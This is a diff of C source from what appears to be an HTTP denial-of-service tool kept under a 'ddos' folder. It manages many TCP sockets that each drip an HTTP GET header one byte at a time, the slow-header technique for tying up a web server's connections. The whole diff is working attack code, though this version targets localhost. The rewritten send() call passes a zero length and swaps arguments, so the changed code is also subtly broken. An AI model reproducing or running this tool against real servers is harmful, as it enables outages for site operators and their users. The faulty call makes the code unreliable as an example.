@@ -52,14 +52,25 @@ void* generate_header_buffering1(void *data) {
 		pthread_mutex_lock(&headbuffer_mutex);
 		thread_clock = clock();
 
-		printf("Log[%d] : T<%d>\n", debug_log++, headbuffer_current);
+		//printf("Log[%d] : T<%d>, S<%d>\n", debug_log++, headbuffer_current,
+		//	headbuffer_sockets[headbuffer_current]);
 
 		//making tcp connection
 		if (headbuffer_sockets[headbuffer_current] == -2) {
 
-			headbuffer_sockets[headbuffer_current] = tcp_make_connection(
-					inet_addr(headbuffer_src_ip), inet_addr(headbuffer_dest_ip),
-					headbuffer_src_port, headbuffer_dest_port,SOCK_STREAM);
+			headbuffer_sockets[headbuffer_current] = socket(AF_INET,
+					SOCK_STREAM, 0);
+			if (headbuffer_sockets[headbuffer_current] == -1)
+				perror("sock creation failed\n");
+
+			struct sockaddr_in servaddr;
+			servaddr.sin_family = AF_INET;
+			servaddr.sin_addr.s_addr = inet_addr(headbuffer_dest_ip);
+			servaddr.sin_port = htons(headbuffer_dest_port);
+
+			if (connect(headbuffer_sockets[headbuffer_current],
+					(struct sockaddr*) &servaddr, sizeof(servaddr)) != 0)
+				perror("connect failed\n");
 
 			headbuffer_src_port++;
 			printf("sock value : %d\n", headbuffer_sockets[headbuffer_current]);
@@ -74,26 +85,28 @@ void* generate_header_buffering1(void *data) {
 			pthread_cond_wait(&headbuffer_cond, &headbuffer_mutex);
 		}
 
-		int sent_size = -9999;
+		int sent_size = -1;
 
-		if (headbuffer_sockets[headbuffer_current] >= 0)
-			sent_size = write(headbuffer_sockets[headbuffer_current],
+		if (headbuffer_sockets[headbuffer_current] >= 0) {
+			sent_size = send(headbuffer_sockets[headbuffer_current],
 					headbuffer_request
-							+ headbuffer_http_cursor[headbuffer_current], 1);
+							+ headbuffer_http_cursor[headbuffer_current], 0, 1);
 
-		printf("Send : %d\n", sent_size);
+			printf("Sending From Socket[%d], wish:<%c>, sent size : %d\n",
+					headbuffer_sockets[headbuffer_current], *(headbuffer_request
+					+ headbuffer_http_cursor[headbuffer_current]),sent_size);
 
-		headbuffer_clocks[headbuffer_current] = clock();
+			headbuffer_clocks[headbuffer_current] = clock();
 
-		headbuffer_http_cursor[headbuffer_current] += 1;
+			headbuffer_http_cursor[headbuffer_current] += 1;
 
-		if (headbuffer_http_cursor[headbuffer_current]
-				>= __HEADER_BUFFERING_REQUEST_MSG_SIZE__) {
-			close(headbuffer_sockets[headbuffer_current]);
-			headbuffer_sockets[headbuffer_current] = -1;
+			if (headbuffer_http_cursor[headbuffer_current]
+					>= __HEADER_BUFFERING_REQUEST_MSG_SIZE__) {
+				close(headbuffer_sockets[headbuffer_current]);
+				headbuffer_sockets[headbuffer_current] = -1;
+			}
+			headbuffer_current++;
 		}
-
-		headbuffer_current++;
 
 		if (headbuffer_current >= headbuffer_total) {
 			headbuffer_current = 0;
@@ -182,22 +195,25 @@ void* headbuffer_time_check(void *data) {
 
 void header_buffering_run(char *argv[], int mode) {
 
-	FILE *get_f;
+	//will be implemented later... ##############
+	/*FILE *get_f;
 
-	get_f = fopen("./src/ddos/http_request.txt", "rb");
-	if (get_f == NULL) {
-		perror("open error! does http_get_request.txt exist?\n");
-		exit(1);
-	}
-	char buffer[__HEADER_BUFFERING_REQUEST_MSG_SIZE__ ];
-	while (fgets(buffer, __HEADER_BUFFERING_REQUEST_MSG_SIZE__, get_f) != NULL) {
-		strcat(headbuffer_request, buffer);
-		strcat(headbuffer_request, "\r\n");
-	}
-	strcat(headbuffer_request, "\r\n");
+	 get_f = fopen("./src/ddos/http_request.txt", "rb");
+	 if (get_f == NULL) {
+	 perror("open error! does http_get_request.txt exist?\n");
+	 exit(1);
+	 }
+	 char buffer[__HEADER_BUFFERING_REQUEST_MSG_SIZE__ ];
+	 while (fgets(buffer, __HEADER_BUFFERING_REQUEST_MSG_SIZE__, get_f) != NULL) {
+	 strcat(headbuffer_request, buffer);
+	 strcat(headbuffer_request, "\r\n");
+	 }
+	 strcat(headbuffer_request, "\r\n");
+	 fclose(get_f);
+	 */
+	strcpy(headbuffer_request, "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n");
 
 	printf("HTTP header msg:\n%s\n", headbuffer_request);
-	fclose(get_f);
 
 	headbuffer_src_ip = (char*) malloc(sizeof(char) * 20);
 	headbuffer_dest_ip = (char*) malloc(sizeof(char) * 20);
